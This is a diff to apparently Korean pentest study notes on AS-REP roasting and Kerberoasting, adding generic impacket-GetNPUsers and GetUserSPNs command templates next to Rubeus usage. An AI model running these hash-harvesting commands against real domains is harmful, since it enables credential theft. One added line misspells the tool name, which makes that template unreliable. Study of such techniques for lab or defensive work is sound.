@@ -33,6 +33,10 @@ impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hash corp.com/pete
 -   **-outputfile** : 덤프한 해시를 저장할 파일 이름.
 -   **corp.com/pete** : 대상 도메인/사용자 계정.
 
+```bash
+impacket-GetNPUsers -dc-ip <ip> -no-pass <domain>/<user>
+```
+
 ``` powershell
 .\Rubeus.exe asreproast /nowrap
 ```
@@ -51,10 +55,13 @@ impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hash corp.com/pete
 ``` bash
 sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 ```
-
 -   **-request** : SPN에 대해 실제 TGS 요청을 전송.
 -   **-dc-ip** : 도메인 컨트롤러 IP.
 -   **corp.com/pete** : 인증에 사용할 도메인/사용자.
+
+```bash
+impacket-GetUsersSPNs -request -dc-ip <ip> <domain>/<user>
+```
 ---
 # Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```bash
